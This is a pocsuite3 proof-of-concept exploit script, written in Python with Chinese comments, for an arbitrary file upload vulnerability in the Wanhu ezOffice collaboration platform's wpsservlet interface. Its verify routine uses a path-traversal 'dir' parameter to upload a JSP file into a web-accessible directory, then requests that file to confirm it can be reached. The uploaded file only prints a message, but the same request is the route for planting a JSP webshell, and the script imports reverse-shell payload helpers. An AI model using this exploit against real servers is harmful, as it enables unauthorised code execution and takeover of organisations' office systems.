# _*_ coding:utf-8 _*_
# @Time : 2023/12/5 10:17
# @Author: 为赋新词强说愁
from pocsuite3.api import Output, POCBase, register_poc, requests, logger
from pocsuite3.api import get_listener_ip, get_listener_port
from pocsuite3.api import REVERSE_PAYLOAD, random_str

class wpsservlet(POCBase):
    pocDesc = '''万户协同办公平台ezoffice wpsservlet接口任意文件上传漏洞'''
    vulID = '2023112802'
    version = '1'
    author = '公众号网络安全透视镜'
    vulDate = '2023-11-28'
    createDate = '2023-11-28'
    updateDate = '2023-11-28'
    name = '万户协同办公平台ezoffice wpsservlet接口任意文件上传漏洞'
    appName = '万户协同办公平台ezoffice'



    def _verify(self):

        result = {}
        url = self.url+ '/defaultroot/wpsservlet?option=saveNewFile&newdocId=security&dir=../platform/portal/layout/&fileType=.jsp'
        check_path = self.url+ "/defaultroot/platform/portal/layout/security.jsp"
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36 Edg/117.0.2045.47",
            'Accept': '*/*',
            'Accept-Encoding': 'gzip, deflate',
            'Cache-Control': 'max-age=0',
            'Connection': 'close',
        }
        payload = "/defaultroot/wpsservlet?option=saveNewFile&newdocId=security&dir=../platform/portal/layout/&fileType=.jsp"
        try:
            files = {
                'NewFile': ('security.jsp', '<% out.print("This website has a vulnerability!!!");%>', 'application/octet-stream')
            }

            response = requests.post(url, headers=headers, files=files)
            if response.status_code == 200:
                check_response = requests.get(check_path, headers=headers, verify=False)
                if check_response.status_code == 200:
                    result['VerifyInfo'] = {}
                    result['VerifyInfo']['URL'] = self.url
                    result['VerifyInfo']['payload'] = payload

            return self.parse_output(result)
        except Exception as e:
            pass

register_poc(wpsservlet)